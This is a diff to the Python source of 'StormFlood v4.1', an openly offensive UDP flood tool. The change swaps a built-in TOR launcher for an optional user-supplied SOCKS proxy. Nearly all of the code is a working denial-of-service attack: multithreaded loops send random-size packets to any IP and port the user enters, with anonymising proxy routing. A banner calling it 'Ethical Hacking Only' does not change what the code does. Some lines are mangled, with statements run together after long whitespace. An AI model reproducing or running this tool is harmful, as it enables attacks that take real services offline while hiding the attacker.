@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
-# StormFlood v4.1 - Ultimate Auto UDP Flood Tool with TOR Support
-# developer Of This Code @hiden_25
+# StormFlood v4.1 - Ultimate Auto UDP Flood Tool
+# @hiden_25
 import socket
-import os
-import random
+import os                                                  import random
 import time
 import threading
 import socks
-import stem.process
 from datetime import datetime
 
 # Colors
@@ -28,25 +26,16 @@ def banner():
  ███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║
  ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝
  """ + N)
-    print(f"{Y}[#] StormFlood v4.1 - Auto UDP Flood Tool with TOR Support")
+    print(f"{Y}[#] StormFlood v4.1 - Auto UDP Flood Tool")
     print(f"{Y}[#] Developed by: {G}@hiden_25 | H2I CODER | CEO DEVELOPER{N}")
     print("\n" + R + "# Stay Anonymous - Ethical Hacking Only\n" + N)
-
-# Start TOR for 100% Anonymity
-def start_tor():                                                          try:
-        print(f"{G}[✔] Starting TOR for Anonymous Proxy...{N}")
-        tor_process = stem.process.launch_tor_with_config(config={'SocksPort': '9050'})
-        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-        socket.socket = socks.socksocket                                      print(f"{G}[✔] TOR Proxy Activated!{N}")
-        return tor_process
-    except Exception as e:                                                    print(f"{R}[X] TOR Start Failed: {e}{N}")
-        return None
 
 # Generate Random Packet Size
 def generate_packet():
     size = random.randint(512, 2048)
     return random._urandom(size)
-                                                                      # UDP Flood Attack
+
+# UDP Flood Attack
 def udp_flood(ip, port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet = generate_packet()
@@ -56,11 +45,15 @@ def udp_flood(ip, port, duration):
         sock.sendto(packet, (ip, port))
         print(f"[→] Sent UDP packet to {ip} through port: {port}")
 
-# Start Attack
-def start_attack(ip, port, duration, use_tor):
-    print(f"{G}[✔] StormFlood v4.1 Attack Started on {ip}:{port} for {duration} seconds.{N}")
+# Proxy Setup (Optional)
+def setup_proxy(proxy_ip, proxy_port):
+    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    socket.socket = socks.socksocket
+    print(f"{G}[✔] Proxy Activated: {proxy_ip}:{proxy_port}{N}")
 
-    tor_process = start_tor() if use_tor else None
+# Start Attack
+def start_attack(ip, port, duration):
+    print(f"{G}[✔] StormFlood v4.1 Attack Started on {ip} at {port} for {duration} seconds.{N}")
 
     threads = []
     for _ in range(5):  # Multi-threading for faster attack
@@ -70,10 +63,6 @@ def start_attack(ip, port, duration, use_tor):
 
     for thread in threads:
         thread.join()
-
-    if tor_process:
-        tor_process.kill()
-        print(f"{Y}[!] TOR Stopped.{N}")
 
     print(f"{G}[✔] Attack Finished!{N}")
 
@@ -85,9 +74,13 @@ def main():
     port = int(input(f"{Y}[$] Enter Port (Default: 80): {N}") or 80)
     duration = int(input(f"{Y}[$] Enter Attack Duration (seconds): {N}"))
 
-    use_tor = input(f"{Y}[?] Use TOR Proxy? (y/n): {N}").lower() == "y"
+    use_proxy = input(f"{Y}[?] Use Proxy? (y/n): {N}").lower()
+    if use_proxy == "y":
+        proxy_ip = input(f"{Y}[$] Proxy IP: {N}")
+        proxy_port = int(input(f"{Y}[$] Proxy Port: {N}"))
+        setup_proxy(proxy_ip, proxy_port)
 
-    start_attack(ip, port, duration, use_tor)
+    start_attack(ip, port, duration)
 
 if __name__ == "__main__":
     main()
